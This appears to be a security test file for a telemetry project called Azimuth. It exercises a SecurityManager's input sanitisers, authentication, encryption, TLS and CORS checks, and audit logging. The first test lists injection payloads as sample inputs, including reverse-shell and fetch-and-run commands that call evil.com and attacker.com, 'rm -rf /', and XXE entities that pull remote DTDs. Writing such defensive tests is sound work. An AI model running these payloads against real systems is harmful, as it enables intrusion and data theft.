// Azimuth 安全漏洞测试用例
// 专注于遥测系统的安全漏洞检测和防护验证

// 测试1: 输入验证和注入攻击防护测试
test "输入验证和注入攻击防护测试" {
  let security_manager = SecurityManager::new()
  
  // 测试SQL注入防护
  let sql_inputs = [
    "'; DROP TABLE users; --",
    "' OR '1'='1",
    "'; INSERT INTO users VALUES ('hacker', 'password'); --",
    "' UNION SELECT username, password FROM users --",
    "'; EXEC xp_cmdshell('format c:'); --"
  ]
  
  for sql_input in sql_inputs {
    let sanitized = SecurityManager::sanitize_sql_input(security_manager, sql_input)
    let is_safe = SecurityManager::is_sql_safe(security_manager, sanitized)
    assert_true(is_safe)
    
    // 验证危险字符被转义或移除
    assert_false(sanitized.contains("'"))
    assert_false(sanitized.contains(";"))
    assert_false(sanitized.contains("--"))
    assert_false(sanitized.contains("/*"))
    assert_false(sanitized.contains("*/"))
    assert_false(sanitized.contains("xp_"))
  }
  
  // 测试XSS防护
  let xss_inputs = [
    "<script>alert('XSS')</script>",
    "<img src=x onerror=alert('XSS')>",
    "javascript:alert('XSS')",
    "<svg onload=alert('XSS')>",
    "<iframe src=javascript:alert('XSS')>",
    "<body onload=alert('XSS')>",
    "<input onfocus=alert('XSS') autofocus>",
    "<select onfocus=alert('XSS') autofocus>",
    "<textarea onfocus=alert('XSS') autofocus>",
    "<keygen onfocus=alert('XSS') autofocus>",
    "<video><source onerror=alert('XSS')>",
    "<audio src=x onerror=alert('XSS')>"
  ]
  
  for xss_input in xss_inputs {
    let sanitized = SecurityManager::sanitize_html_input(security_manager, xss_input)
    let is_safe = SecurityManager::is_html_safe(security_manager, sanitized)
    assert_true(is_safe)
    
    // 验证危险标签被移除或转义
    assert_false(sanitized.contains("<script>"))
    assert_false(sanitized.contains("onerror="))
    assert_false(sanitized.contains("onload="))
    assert_false(sanitized.contains("onfocus="))
    assert_false(sanitized.contains("javascript:"))
  }
  
  // 测试命令注入防护
  let command_inputs = [
    "; rm -rf /",
    "| cat /etc/passwd",
    "& ping -c 100 127.0.0.1",
    "`whoami`",
    "$(id)",
    "; nc -e /bin/sh attacker.com 4444",
    "| curl http://evil.com/steal.sh | sh",
    "&& wget http://evil.com/malware",
    "; /bin/bash -c 'curl http://evil.com'",
    "`python -c 'import os; os.system(\"rm -rf /\")'`"
  ]
  
  for command_input in command_inputs {
    let sanitized = SecurityManager::sanitize_command_input(security_manager, command_input)
    let is_safe = SecurityManager::is_command_safe(security_manager, sanitized)
    assert_true(is_safe)
    
    // 验证危险字符被移除
    assert_false(sanitized.contains(";"))
    assert_false(sanitized.contains("|"))
    assert_false(sanitized.contains("&"))
    assert_false(sanitized.contains("`"))
    assert_false(sanitized.contains("$("))
  }
  
  // 测试LDAP注入防护
  let ldap_inputs = [
    "*)(&",
    "*)(|(objectClass=*))",
    "*)(|(password=*))",
    "*)(|(cn=*))",
    "*))(|(cn=*",
    "admin)(&(password=*",
    "*)|(uid=*",
    "*)(uid=*))(cn=*"
  ]
  
  for ldap_input in ldap_inputs {
    let sanitized = SecurityManager::sanitize_ldap_input(security_manager, ldap_input)
    let is_safe = SecurityManager::is_ldap_safe(security_manager, sanitized)
    assert_true(is_safe)
    
    // 验证危险字符被转义
    assert_false(sanitized.contains("*"))
    assert_false(sanitized.contains("("))
    assert_false(sanitized.contains(")"))
    assert_false(sanitized.contains("|"))
    assert_false(sanitized.contains("&"))
  }
  
  // 测试NoSQL注入防护
  let nosql_inputs = [
    {"$ne": ""},
    {"$gt": ""},
    {"$where": "function() { return true; }"},
    {"$regex": ".*"},
    {"$in": ["admin", "user"]},
    {"$nin": ["guest"]},
    {"$exists": true},
    {"$mod": [2, 0]},
    {"$all": ["admin"]},
    {"$size": 0}
  ]
  
  for nosql_input in nosql_inputs {
    let sanitized = SecurityManager::sanitize_nosql_input(security_manager, nosql_input)
    let is_safe = SecurityManager::is_nosql_safe(security_manager, sanitized)
    assert_true(is_safe)
    
    // 验证危险操作符被移除
    assert_false(Json::stringify(sanitized).contains("$ne"))
    assert_false(Json::stringify(sanitized).contains("$gt"))
    assert_false(Json::stringify(sanitized).contains("$where"))
    assert_false(Json::stringify(sanitized).contains("$regex"))
  }
  
  // 测试路径遍历防护
  let path_inputs = [
    "../../../etc/passwd",
    "..\\..\\..\\windows\\system32\\config\\sam",
    "....//....//....//etc/passwd",
    "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
    "..%252f..%252f..%252fetc%252fpasswd",
    "....\\\\....\\\\....\\\\windows\\\\system32\\\\config\\\\sam",
    "/var/www/../../etc/passwd",
    "file:///etc/passwd",
    "../etc/passwd%00",
    "..%c0%af..%c0%af..%c0%afetc%c0%afpasswd"
  ]
  
  for path_input in path_inputs {
    let sanitized = SecurityManager::sanitize_path_input(security_manager, path_input)
    let is_safe = SecurityManager::is_path_safe(security_manager, sanitized)
    assert_true(is_safe)
    
    // 验证路径遍历字符被移除
    assert_false(sanitized.contains("../"))
    assert_false(sanitized.contains("..\\"))
    assert_false(sanitized.contains("%2e"))
    assert_false(sanitized.contains("%c0"))
  }
  
  // 测试XML外部实体攻击防护
  let xxe_inputs = [
    "<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><foo>&xxe;</foo>",
    "<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM \"http://evil.com/evil.xml\">]><foo>&xxe;</foo>",
    "<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"php://filter/read=convert.base64-encode/resource=index.php\">]><foo>&xxe;</foo>",
    "<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM \"http://evil.com/evil.dtd\">%xxe;]><foo>&test;</foo>"
  ]
  
  for xxe_input in xxe_inputs {
    let sanitized = SecurityManager::sanitize_xml_input(security_manager, xxe_input)
    let is_safe = SecurityManager::is_xml_safe(security_manager, sanitized)
    assert_true(is_safe)
    
    // 验证危险实体被移除
    assert_false(sanitized.contains("<!ENTITY"))
    assert_false(sanitized.contains("<!DOCTYPE"))
    assert_false(sanitized.contains("SYSTEM"))
    assert_false(sanitized.contains("file://"))
  }
}

// 测试2: 认证和授权安全测试
test "认证和授权安全测试" {
  let security_manager = SecurityManager::new()
  
  // 测试密码策略
  let weak_passwords = [
    "password",
    "123456",
    "qwerty",
    "admin",
    "letmein",
    "welcome",
    "monkey",
    "1234567890",
    "abc123",
    "password123"
  ]
  
  for weak_password in weak_passwords {
    let password_strength = SecurityManager::check_password_strength(security_manager, weak_password)
    assert_true(password_strength.score < 50)  // 弱密码分数应该低于50
    assert_true(password_strength.issues.length() > 0)  // 应该有安全问题
  }
  
  let strong_passwords = [
    "Tr0ub4dour&3",
    "correct-horse-battery-staple",
    "MyP@ssw0rd!123",
    "Th1sIsAStr0ngP@ssw0rd",
    "C0mpl3x!ty#Rul3s"
  ]
  
  for strong_password in strong_passwords {
    let password_strength = SecurityManager::check_password_strength(security_manager, strong_password)
    assert_true(password_strength.score >= 80)  // 强密码分数应该至少80
    assert_true(password_strength.issues.length() == 0)  // 不应该有安全问题
  }
  
  // 测试密码哈希
  let test_password = "MySecurePassword123!"
  let hashed_password = SecurityManager::hash_password(security_manager, test_password)
  assert_true(hashed_password.length() >= 60)  // 哈希值应该足够长
  assert_false(hashed_password.contains(test_password))  // 哈希值不应该包含明文密码
  
  // 验证密码
  let is_valid = SecurityManager::verify_password(security_manager, test_password, hashed_password)
  assert_true(is_valid)
  
  let is_invalid = SecurityManager::verify_password(security_manager, "WrongPassword", hashed_password)
  assert_false(is_invalid)
  
  // 测试会话管理
  let user_id = "user123"
  let session_token = SecurityManager::create_session(security_manager, user_id)
  assert_true(session_token.length() >= 32)  // 会话令牌应该足够长
  
  // 验证会话
  let session_user = SecurityManager::validate_session(security_manager, session_token)
  assert_eq(session_user, Some(user_id))
  
  // 测试会话过期
  SecurityManager::set_session_timeout(security_manager, 1)  // 1秒超时
  Thread::sleep(1100)  // 等待1.1秒
  
  let expired_session_user = SecurityManager::validate_session(security_manager, session_token)
  assert_eq(expired_session_user, None)  // 过期的会话应该无效
  
  // 测试权限检查
  let admin_permissions = ["read", "write", "delete", "admin"]
  let user_permissions = ["read", "write"]
  
  SecurityManager::set_user_permissions(security_manager, "admin", admin_permissions)
  SecurityManager::set_user_permissions(security_manager, "user1", user_permissions)
  
  // 测试管理员权限
  let admin_can_delete = SecurityManager::check_permission(security_manager, "admin", "delete")
  assert_true(admin_can_delete)
  
  // 测试普通用户权限
  let user_can_delete = SecurityManager::check_permission(security_manager, "user1", "delete")
  assert_false(user_can_delete)
  
  let user_can_read = SecurityManager::check_permission(security_manager, "user1", "read")
  assert_true(user_can_read)
  
  // 测试权限继承
  let manager_permissions = ["read", "write", "manage"]
  SecurityManager::set_user_permissions(security_manager, "manager", manager_permissions)
  SecurityManager::add_permission_inheritance(security_manager, "manager", "user1")
  
  let manager_can_read_user_data = SecurityManager::check_permission(security_manager, "manager", "read", "user1")
  assert_true(manager_can_read_user_data)
  
  // 测试多因素认证
  let mfa_secret = SecurityManager::generate_mfa_secret(security_manager)
  assert_true(mfa_secret.length() >= 16)  // MFA密钥应该足够长
  
  // 生成MFA令牌
  let mfa_token = SecurityManager::generate_mfa_token(security_manager, mfa_secret)
  assert_true(mfa_token.length() == 6)  // MFA令牌应该是6位数字
  
  // 验证MFA令牌
  let mfa_valid = SecurityManager::verify_mfa_token(security_manager, mfa_secret, mfa_token)
  assert_true(mfa_valid)
  
  let mfa_invalid = SecurityManager::verify_mfa_token(security_manager, mfa_secret, "000000")
  assert_false(mfa_invalid)
  
  // 测试暴力破解防护
  let failed_attempts = []
  for i in 0..10 {
    let login_result = SecurityManager::attempt_login(security_manager, "user1", "wrong_password" + i.to_string())
    assert_false(login_result.success)
    failed_attempts.push(login_result)
  }
  
  // 验证账户被锁定
  let is_locked = SecurityManager::is_account_locked(security_manager, "user1")
  assert_true(is_locked)
  
  let login_locked = SecurityManager::attempt_login(security_manager, "user1", "correct_password")
  assert_false(login_locked.success)
  assert_true(login_locked.error_message.contains("account locked"))
  
  // 解锁账户
  SecurityManager::unlock_account(security_manager, "user1")
  let is_unlocked = SecurityManager::is_account_locked(security_manager, "user1")
  assert_false(is_unlocked)
}

// 测试3: 数据加密和保护测试
test "数据加密和保护测试" {
  let security_manager = SecurityManager::new()
  
  // 测试对称加密
  let plaintext = "This is a secret message that needs to be encrypted."
  let encryption_key = SecurityManager::generate_encryption_key(security_manager, 256)  // 256位密钥
  
  let encrypted_data = SecurityManager::encrypt_symmetric(security_manager, plaintext, encryption_key)
  assert_true(encrypted_data.length() > 0)
  assert_false(encrypted_data.contains(plaintext))  // 加密数据不应该包含明文
  
  let decrypted_data = SecurityManager::decrypt_symmetric(security_manager, encrypted_data, encryption_key)
  assert_eq(decrypted_data, plaintext)
  
  // 测试非对称加密
  let (public_key, private_key) = SecurityManager::generate_key_pair(security_manager, 2048)  // 2048位RSA密钥
  
  let asymmetric_encrypted = SecurityManager::encrypt_asymmetric(security_manager, plaintext, public_key)
  assert_true(asymmetric_encrypted.length() > 0)
  assert_false(asymmetric_encrypted.contains(plaintext))
  
  let asymmetric_decrypted = SecurityManager::decrypt_asymmetric(security_manager, asymmetric_encrypted, private_key)
  assert_eq(asymmetric_decrypted, plaintext)
  
  // 测试数字签名
  let message = "This message needs to be signed for authenticity."
  let signature = SecurityManager::sign_data(security_manager, message, private_key)
  assert_true(signature.length() > 0)
  
  let is_signature_valid = SecurityManager::verify_signature(security_manager, message, signature, public_key)
  assert_true(is_signature_valid)
  
  let is_tampered_valid = SecurityManager::verify_signature(security_manager, "Tampered message", signature, public_key)
  assert_false(is_tampered_valid)
  
  // 测试哈希函数
  let hash_data = "Data to be hashed for integrity verification."
  let hash_value = SecurityManager::hash_data(security_manager, hash_data, "SHA-256")
  assert_true(hash_value.length() == 64)  // SHA-256哈希应该是64个字符
  
  let hash_value2 = SecurityManager::hash_data(security_manager, hash_data, "SHA-256")
  assert_eq(hash_value, hash_value2)  // 相同数据应该产生相同哈希
  
  let hash_value3 = SecurityManager::hash_data(security_manager, "Different data", "SHA-256")
  assert_ne(hash_value, hash_value3)  // 不同数据应该产生不同哈希
  
  // 测试密钥派生
  let password = "user_password_123"
  let salt = SecurityManager::generate_salt(security_manager)
  let derived_key = SecurityManager::derive_key(security_manager, password, salt, 10000, 32)  // PBKDF2
  assert_true(derived_key.length() == 64)  // 32字节 = 64个十六进制字符
  
  // 测试数据脱敏
  let sensitive_data = "John Doe, john.doe@example.com, 123-45-6789, 555-123-4567"
  let masked_data = SecurityManager::mask_sensitive_data(security_manager, sensitive_data)
  assert_true(masked_data.contains("Jo***"))
  assert_true(masked_data.contains("jo***@***.com"))
  assert_true(masked_data.contains("***-**-6789"))
  assert_true(masked_data.contains("***-***-4567"))
  
  // 测试安全随机数生成
  let random_bytes = SecurityManager::generate_secure_random(security_manager, 32)
  assert_eq(random_bytes.length(), 32)
  
  // 验证随机性
  let random_bytes2 = SecurityManager::generate_secure_random(security_manager, 32)
  assert_ne(random_bytes, random_bytes2)
  
  // 测试密钥轮换
  let old_key = SecurityManager::generate_encryption_key(security_manager, 256)
  let new_key = SecurityManager::generate_encryption_key(security_manager, 256)
  
  // 用旧密钥加密数据
  let encrypted_with_old = SecurityManager::encrypt_symmetric(security_manager, plaintext, old_key)
  
  // 密钥轮换
  let reencrypted_data = SecurityManager::rotate_key(security_manager, encrypted_with_old, old_key, new_key)
  assert_ne(encrypted_with_old, reencrypted_data)
  
  // 用新密钥解密
  let decrypted_with_new = SecurityManager::decrypt_symmetric(security_manager, reencrypted_data, new_key)
  assert_eq(decrypted_with_new, plaintext)
  
  // 测试密钥销毁
  let key_to_destroy = SecurityManager::generate_encryption_key(security_manager, 256)
  let key_before_destroy = SecurityManager::export_key(security_manager, key_to_destroy)
  assert_true(key_before_destroy.length() > 0)
  
  SecurityManager::destroy_key(security_manager, key_to_destroy)
  let key_after_destroy = SecurityManager::export_key(security_manager, key_to_destroy)
  assert_eq(key_after_destroy, "")  // 销毁的密钥应该为空
  
  // 测试内存安全
  let sensitive_memory = "Top secret information in memory"
  let secure_memory = SecurityManager::allocate_secure_memory(security_manager, sensitive_memory.length())
  SecurityManager::write_to_secure_memory(security_manager, secure_memory, sensitive_memory)
  
  let read_back = SecurityManager::read_from_secure_memory(security_manager, secure_memory)
  assert_eq(read_back, sensitive_memory)
  
  // 清理安全内存
  SecurityManager::clear_secure_memory(security_manager, secure_memory)
  let cleared_memory = SecurityManager::read_from_secure_memory(security_manager, secure_memory)
  assert_ne(cleared_memory, sensitive_memory)  // 清理后的内存应该不同
}

// 测试4: 网络安全测试
test "网络安全测试" {
  let security_manager = SecurityManager::new()
  
  // 测试HTTPS证书验证
  let test_urls = [
    "https://expired.badssl.com",
    "https://wrong.host.badssl.com",
    "https://self-signed.badssl.com",
    "https://untrusted-root.badssl.com",
    "https://revoked.badssl.com",
    "https://pinning-test.badssl.com",
    "https://no-common-name.badssl.com",
    "https://invalid-expected-sct.badssl.com"
  ]
  
  for url in test_urls {
    let cert_validation = SecurityManager::validate_certificate(security_manager, url)
    assert_false(cert_validation.valid)  // 这些URL的证书应该无效
    assert_true(cert_validation.errors.length() > 0)
  }
  
  // 测试有效证书
  let valid_url = "https://badssl.com"
  let valid_cert_validation = SecurityManager::validate_certificate(security_manager, valid_url)
  assert_true(valid_cert_validation.valid)
  assert_eq(valid_cert_validation.errors.length(), 0)
  
  // 测试TLS配置
  let tls_config = SecurityManager::get_tls_config(security_manager)
  assert_true(tls_config.min_version >= "TLS1.2")  // 最小TLS版本应该是1.2
  assert_true(tls_config.cipher_suites.length() > 0)
  assert_false(tls_config.cipher_suites.contains("RC4"))  // 不应该包含不安全的加密算法
  assert_false(tls_config.cipher_suites.contains("DES"))
  assert_false(tls_config.cipher_suites.contains("3DES"))
  
  // 测试HSTS
  let hsts_header = "max-age=31536000; includeSubDomains; preload"
  let hsts_config = SecurityManager::parse_hsts_header(security_manager, hsts_header)
  assert_eq(hsts_config.max_age, 31536000)
  assert_true(hsts_config.include_subdomains)
  assert_true(hsts_config.preload)
  
  // 测试CORS配置
  let cors_headers = {
    "Access-Control-Allow-Origin": "https://trusted.example.com",
    "Access-Control-Allow-Methods": "GET, POST, PUT, DELETE",
    "Access-Control-Allow-Headers": "Content-Type, Authorization",
    "Access-Control-Max-Age": "86400",
    "Access-Control-Allow-Credentials": "true"
  }
  
  let cors_config = SecurityManager::parse_cors_headers(security_manager, cors_headers)
  assert_eq(cors_config.allowed_origin, Some("https://trusted.example.com"))
  assert_true(cors_config.allowed_methods.contains("GET"))
  assert_true(cors_config.allowed_methods.contains("POST"))
  assert_true(cors_config.allow_credentials)
  
  // 测试不安全的CORS配置
  let unsafe_cors_headers = {
    "Access-Control-Allow-Origin": "*",
    "Access-Control-Allow-Credentials": "true"
  }
  
  let unsafe_cors_config = SecurityManager::parse_cors_headers(security_manager, unsafe_cors_headers)
  let cors_safety = SecurityManager::check_cors_safety(security_manager, unsafe_cors_config)
  assert_false(cors_safety.is_safe)
  assert_true(cors_safety.issues.contains("Wildcard origin with credentials not allowed"))
  
  // 测试CSRF保护
  let csrf_token = SecurityManager::generate_csrf_token(security_manager)
  assert_true(csrf_token.length() >= 32)  // CSRF令牌应该足够长
  
  let is_csrf_valid = SecurityManager::validate_csrf_token(security_manager, csrf_token)
  assert_true(is_csrf_valid)
  
  let is_csrf_invalid = SecurityManager::validate_csrf_token(security_manager, "invalid_token")
  assert_false(is_csrf_invalid)
  
  // 测试HTTP安全头
  let security_headers = {
    "X-Frame-Options": "DENY",
    "X-Content-Type-Options": "nosniff",
    "X-XSS-Protection": "1; mode=block",
    "Strict-Transport-Security": "max-age=31536000; includeSubDomains",
    "Content-Security-Policy": "default-src 'self'; script-src 'self' 'unsafe-inline'; style-src 'self' 'unsafe-inline'",
    "Referrer-Policy": "strict-origin-when-cross-origin"
  }
  
  let header_security = SecurityManager::check_security_headers(security_manager, security_headers)
  assert_true(header_security.score >= 80)  // 安全头评分应该至少80
  
  // 测试不安全的HTTP头
  let unsafe_headers = {
    "X-Frame-Options": "ALLOWALL",
    "X-XSS-Protection": "0"
  }
  
  let unsafe_header_security = SecurityManager::check_security_headers(security_manager, unsafe_headers)
  assert_true(unsafe_header_security.score < 50)
  assert_true(unsafe_header_security.issues.length() > 0)
  
  // 测试请求验证
  let malicious_request = {
    "url": "https://example.com/api/data?user=admin'; DROP TABLE users; --",
    "method": "POST",
    "headers": {
      "User-Agent": "Mozilla/5.0 (compatible; BadBot/1.0)",
      "X-Forwarded-For": "192.168.1.1",
      "Referer": "http://evil.com"
    },
    "body": "{\"query\": \"SELECT * FROM users WHERE id = 1 OR 1=1\"}"
  }
  
  let request_validation = SecurityManager::validate_request(security_manager, malicious_request)
  assert_false(request_validation.is_safe)
  assert_true(request_validation.issues.contains("SQL injection attempt detected"))
  assert_true(request_validation.issues.contains("Suspicious user agent"))
  
  // 测试API限流
  let client_ip = "192.168.1.100"
  
  // 发送正常数量的请求
  for i in 0..100 {
    let rate_limit_result = SecurityManager::check_rate_limit(security_manager, client_ip, "api")
    assert_true(rate_limit_result.allowed)
  }
  
  // 发送超出限制的请求
  for i in 0..50 {
    let rate_limit_result = SecurityManager::check_rate_limit(security_manager, client_ip, "api")
    if i < 10 {
      assert_true(rate_limit_result.allowed)
    } else {
      assert_false(rate_limit_result.allowed)
      assert_true(rate_limit_result.retry_after > 0)
    }
  }
}

// 测试5: 日志和审计安全测试
test "日志和审计安全测试" {
  let security_manager = SecurityManager::new()
  
  // 测试敏感信息过滤
  let log_entries = [
    "User login successful for user: admin with password: secret123",
    "Database connection established with credentials: user=admin;password=secret123",
    "API key used for authentication: sk_live_1234567890abcdef",
    "Credit card number: 4111-1111-1111-1111 processed successfully",
    "Social security number: 123-45-6789 stored in database",
    "Email address: john.doe@example.com logged in",
    "Phone number: 555-123-4567 verified",
    "IP address: 192.168.1.100 logged in",
    "Session token: abc123def456ghi789 created"
  ]
  
  for log_entry in log_entries {
    let filtered_entry = SecurityManager::filter_sensitive_data(security_manager, log_entry)
    
    // 验证敏感信息被过滤
    assert_false(filtered_entry.contains("secret123"))
    assert_false(filtered_entry.contains("sk_live_1234567890abcdef"))
    assert_false(filtered_entry.contains("4111-1111-1111-1111"))
    assert_false(filtered_entry.contains("123-45-6789"))
    assert_false(filtered_entry.contains("john.doe@example.com"))
    assert_false(filtered_entry.contains("555-123-4567"))
    assert_false(filtered_entry.contains("192.168.1.100"))
    assert_false(filtered_entry.contains("abc123def456ghi789"))
    
    // 验证保留非敏感信息
    if log_entry.contains("admin") {
      assert_true(filtered_entry.contains("admin"))
    }
    if log_entry.contains("login") {
      assert_true(filtered_entry.contains("login"))
    }
  }
  
  // 测试审计日志
  let audit_events = [
    {
      "type": "user_login",
      "user": "admin",
      "timestamp": "2023-01-01T12:00:00Z",
      "ip": "192.168.1.100",
      "status": "success"
    },
    {
      "type": "data_access",
      "user": "user1",
      "timestamp": "2023-01-01T12:05:00Z",
      "resource": "/api/users",
      "action": "read"
    },
    {
      "type": "privilege_escalation",
      "user": "user1",
      "timestamp": "2023-01-01T12:10:00Z",
      "from_role": "user",
      "to_role": "admin"
    },
    {
      "type": "data_modification",
      "user": "admin",
      "timestamp": "2023-01-01T12:15:00Z",
      "resource": "/api/users/123",
      "action": "update"
    },
    {
      "type": "security_violation",
      "user": "unknown",
      "timestamp": "2023-01-01T12:20:00Z",
      "violation": "multiple_failed_logins",
      "ip": "10.0.0.1"
    }
  ]
  
  // 记录审计事件
  for event in audit_events {
    SecurityManager::log_audit_event(security_manager, event)
  }
  
  // 验证审计日志完整性
  let audit_log = SecurityManager::get_audit_log(security_manager)
  assert_eq(audit_log.length(), audit_events.length)
  
  // 测试审计日志签名
  let audit_signature = SecurityManager::sign_audit_log(security_manager, audit_log)
  assert_true(audit_signature.length() > 0)
  
  // 验证审计日志完整性
  let is_integrity_valid = SecurityManager::verify_audit_log_integrity(security_manager, audit_log, audit_signature)
  assert_true(is_integrity_valid)
  
  // 测试篡改检测
  let tampered_log = audit_log
  tampered_log[0].user = "hacker"
  
  let is_tampered_valid = SecurityManager::verify_audit_log_integrity(security_manager, tampered_log, audit_signature)
  assert_false(is_tampered_valid)
  
  // 测试日志轮换
  SecurityManager::rotate_audit_log(security_manager)
  let rotated_log = SecurityManager::get_audit_log(security_manager)
  assert_eq(rotated_log.length(), 0)  // 轮换后日志应该为空
  
  // 测试日志归档
  let archived_logs = SecurityManager::get_archived_logs(security_manager)
  assert_true(archived_logs.length() > 0)
  
  // 测试日志查询
  let security_events = SecurityManager::query_audit_log(security_manager, {
    "type": "security_violation",
    "start_time": "2023-01-01T00:00:00Z",
    "end_time": "2023-01-01T23:59:59Z"
  })
  
  assert_eq(security_events.length(), 1)
  assert_eq(security_events[0].type, "security_violation")
  
  // 测试日志加密
  let log_encryption_key = SecurityManager::generate_encryption_key(security_manager, 256)
  let encrypted_log = SecurityManager::encrypt_audit_log(security_manager, audit_log, log_encryption_key)
  assert_true(encrypted_log.length() > 0)
  
  let decrypted_log = SecurityManager::decrypt_audit_log(security_manager, encrypted_log, log_encryption_key)
  assert_eq(decrypted_log.length(), audit_log.length())
  
  // 测试日志访问控制
  SecurityManager::set_log_access_permissions(security_manager, "auditor", ["read", "query"])
  SecurityManager::set_log_access_permissions(security_manager, "admin", ["read", "query", "delete"])
  
  let auditor_can_read = SecurityManager::check_log_access(security_manager, "auditor", "read")
  assert_true(auditor_can_read)
  
  let auditor_can_delete = SecurityManager::check_log_access(security_manager, "auditor", "delete")
  assert_false(auditor_can_delete)
  
  let admin_can_delete = SecurityManager::check_log_access(security_manager, "admin", "delete")
  assert_true(admin_can_delete)
  
  // 测试日志保留策略
  SecurityManager::set_retention_policy(security_manager, {
    "security_violation": 2555,  // 7年
    "user_login": 365,         // 1年
    "data_access": 90,          // 90天
    "default": 30               // 30天
  })
  
  let retention_policy = SecurityManager::get_retention_policy(security_manager)
  assert_eq(retention_policy.get("security_violation"), Some(2555))
  assert_eq(retention_policy.get("user_login"), Some(365))
  assert_eq(retention_policy.get("data_access"), Some(90))
  assert_eq(retention_policy.get("default"), Some(30))
  
  // 测试日志清理
  SecurityManager::cleanup_old_logs(security_manager)
  let cleanup_result = SecurityManager::get_cleanup_result(security_manager)
  assert_true(cleanup_result.success)
  assert_true(cleanup_result.cleaned_logs >= 0)
}